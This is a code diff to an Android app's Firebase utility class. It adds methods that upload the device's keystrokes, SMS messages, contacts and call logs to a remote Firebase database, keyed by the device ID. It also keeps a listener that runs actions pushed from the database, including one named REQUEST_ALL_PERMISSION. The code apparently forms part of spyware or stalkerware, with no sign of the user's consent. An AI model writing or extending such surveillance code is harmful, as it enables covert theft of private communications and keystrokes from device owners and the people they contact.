@@ -13,25 +13,30 @@ import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
-import com.google.gson.JsonObject;
 import com.vikasyadavnsit.cdc.constants.AppConstants;
+import com.vikasyadavnsit.cdc.data.KeyStrokeData;
 import com.vikasyadavnsit.cdc.data.User;
 import com.vikasyadavnsit.cdc.enums.ActionStatus;
 import com.vikasyadavnsit.cdc.enums.ClickActions;
 
-import org.json.JSONObject;
-
 import java.util.Arrays;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 
 public class FirebaseUtils {
+
+    private static Context context;
+
+    public static void initialize(Context context) {
+        FirebaseUtils.context = context;
+    }
 
     // Get a reference to the database
     public static FirebaseDatabase getDatabase() {
         FirebaseDatabase database = FirebaseDatabase.getInstance(
                 AppConstants.FIREBASE_DATABASE_REGION_URL);
-       // database.setPersistenceEnabled(true);
+        // database.setPersistenceEnabled(true);
         return database;
     }
 
@@ -42,7 +47,7 @@ public class FirebaseUtils {
         return reference;
     }
 
-    private static String getPath(Context context, String path) {
+    private static String getPath(String path) {
         return getBasePath(context) + path;
     }
 
@@ -50,14 +55,14 @@ public class FirebaseUtils {
         return AppConstants.FIREBASE_RTDB_BASE_PATH + getAndroidID(context);
     }
 
-    public static void getAppTriggerSettingsData(Context context) {
-        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath(context, "/appSettings/appTriggerSettingsDataMap"));
+    public static void getAppTriggerSettingsData() {
+        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/appSettings/appTriggerSettingsDataMap"));
         appTriggerSettingDataRef.addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                 if (!dataSnapshot.exists()) {
                     // User does not exist, create a new user
-                    appTriggerSettingDataRef.setValue(createAppTriggerSettingsDataMap(context));
+                    appTriggerSettingDataRef.setValue(createAppTriggerSettingsDataMap());
                 } else {
                     ActionUtils.performFirebaseAction(dataSnapshot.getValue(Object.class));
                 }
@@ -71,7 +76,7 @@ public class FirebaseUtils {
         });
     }
 
-    private static Map<String, User.AppTriggerSettingsData> createAppTriggerSettingsDataMap(Context context) {
+    private static Map<String, User.AppTriggerSettingsData> createAppTriggerSettingsDataMap() {
         Map<String, User.AppTriggerSettingsData> map = new HashMap<>();
         Arrays.stream(ClickActions.values()).forEach(clickAction -> {
             User.AppTriggerSettingsData obj = User.AppTriggerSettingsData.builder()
@@ -89,14 +94,14 @@ public class FirebaseUtils {
         return map;
     }
 
-    public static void checkAndCreateUser(Context context) {
+    public static void checkAndCreateUser() {
         DatabaseReference userRef = getDbRef(getBasePath(context));
         userRef.addListenerForSingleValueEvent(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                 if (!dataSnapshot.exists()) {
                     // User does not exist, create a new user
-                    userRef.setValue(getUserData(context));
+                    userRef.setValue(getUserData());
                 }
             }
 
@@ -108,24 +113,37 @@ public class FirebaseUtils {
         });
     }
 
-    private static User getUserData(Context context) {
+    private static User getUserData() {
         return User.builder()
                 .fullName("Vikas Simulator")
-                .userDetails(Map.of())
                 .deviceDetails(getDeviceDetails(context))
-                .appSettings(
-                        User.AppSettings.builder()
-                                .appTriggerSettingsDataMap(
-                                        Map.of("", User.AppTriggerSettingsData.builder()
-                                                .enabled(true)
-                                                .clickActions(ClickActions.REQUEST_ALL_PERMISSION)
-                                                .build())
-                                )
-                                .appSettingsMap(Map.of())
-                                .build()
-                )
-                .userSettings(Map.of())
                 .build();
+    }
+
+    public static void uploadUserKeystrokeDataSnapshot(KeyStrokeData keyStrokeData) {
+        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/keystrokes"));
+        appTriggerSettingDataRef.push().setValue(keyStrokeData);
+    }
+
+    public static void uploadUserSmsDataSnapshot(List<Map<String, String>> messages) {
+        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/sms"));
+        for (Map<String, String> message : messages) {
+            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
+        }
+    }
+
+    public static void uploadUserContactsDataSnapshot(List<Map<String, String>> messages) {
+        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/contacts"));
+        for (Map<String, String> message : messages) {
+            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
+        }
+    }
+
+    public static void uploadUserCallLogsDataSnapshot(List<Map<String, String>> messages) {
+        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/callLogs"));
+        for (Map<String, String> message : messages) {
+            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
+        }
     }
 
 }
